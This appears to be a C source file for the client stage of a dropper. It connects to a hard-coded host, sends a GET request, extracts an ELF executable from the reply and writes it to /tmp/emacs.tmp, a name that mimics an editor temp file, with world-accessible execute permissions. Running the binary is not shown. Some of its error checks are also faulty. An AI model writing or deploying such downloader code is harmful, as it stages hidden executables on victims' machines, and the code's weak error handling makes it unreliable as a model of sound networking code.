#include "client.h"

int                     init_connection(void)
{
    int                 sock;
    struct sockaddr_in  remote;

    if (!(sock = socket(AF_INET, SOCK_STREAM, 0)))
         return (-1);
    remote.sin_addr.s_addr = inet_addr(DEFAULT_IP);
    remote.sin_family = AF_INET;
    remote.sin_port = htons(DEFAULT_PORT);
    if (connect(sock, (struct sockaddr *)&remote, sizeof(remote)) < 0)
        return (-1);
    return (sock);
}

// parse and extract daemon
// TODO : parse Content-Length header
void            parse_request(t_data *data, int fd)
{
    bool        ok;
    void        *start;
    t_data      *tmp;

    ok = false;
    tmp = data;
    while (tmp != NULL)
    {
        if (ok == false)
        {
            start = memchr(tmp->line, 0x7f, tmp->len);
            if (start && (*(unsigned int*)start == 0x464c457f)) //  0X7F454C46)
            {
                write(fd, start, tmp->len - ((void*)start - (void*)tmp->line));
                ok = true;
            }
        }
        else
            write(fd, tmp->line, tmp->len);
        tmp = tmp->next;
    }
}

bool    download_daemon(int sock, int fd)
{
    int         len;
    char        buffer[RECV_LEN];
    t_data      *data;

    data = NULL;
    while (true)
    {
        len = recv(sock, buffer, RECV_LEN, 0);
        if (len <= 0)
            break ;
        data_add(&data, buffer, len);
    }
    parse_request(data, fd);
    data_free(&data);
    return (true);
}

bool    get_daemon(void)
{
    int fd;
    int sock;

    if ((sock = init_connection()) == -1)
        return (false);

    // send the get request to download the daemon
    if (!(send(sock, GET_REQUEST, sizeof(GET_REQUEST), 0)))
        return (false);

    if ((fd = open("/tmp/emacs.tmp", O_RDWR | O_CREAT | O_TRUNC, S_IRWXU | S_IRWXO )))
        download_daemon(sock, fd);
    close(fd);
    close(sock);
    return (true);
}
